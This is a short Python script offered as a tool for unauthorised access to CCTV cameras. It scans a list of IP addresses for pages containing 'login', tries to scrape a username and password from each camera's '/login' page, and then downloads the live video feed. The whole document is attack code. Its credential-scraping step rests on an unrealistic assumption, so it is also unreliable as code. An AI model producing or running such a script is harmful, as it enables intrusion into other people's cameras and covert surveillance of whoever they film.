import requests
import re

# Function to find CCTV cameras
def find_cameras(ip_range):
    found_cameras = []
    for ip in ip_range:
        try:
            response = requests.get(f'http://{ip}/')
            if 'login' in response.text:
                found_cameras.append(ip)
        except:
            continue
    return found_cameras

# Function to get login credentials
def get_credentials(ip):
    try:
        response = requests.get(f'http://{ip}/login')
        username = re.search(r'Username: (.*)', response.text).group(1)
        password = re.search(r'Password: (.*)', response.text).group(1)
        return username, password
    except:
        return None, None

# Function to access the live feed
def access_feed(ip, username, password):
    try:
        session = requests.Session()
        session.auth = (username, password)
        feed_url = f'http://{ip}/feed'
        live_feed = session.get(feed_url)
        return live_feed.content
    except:
        return None

# Example usage
ip_range = ['192.168.1.1', '192.168.1.2', '192.168.1.3']  # Adjust range
cameras = find_cameras(ip_range)
for camera in cameras:
    username, password = get_credentials(camera)
    if username and password:
        live_feed = access_feed(camera, username, password)
        if live_feed:
            print(f'Live feed from {camera}: {live_feed}')
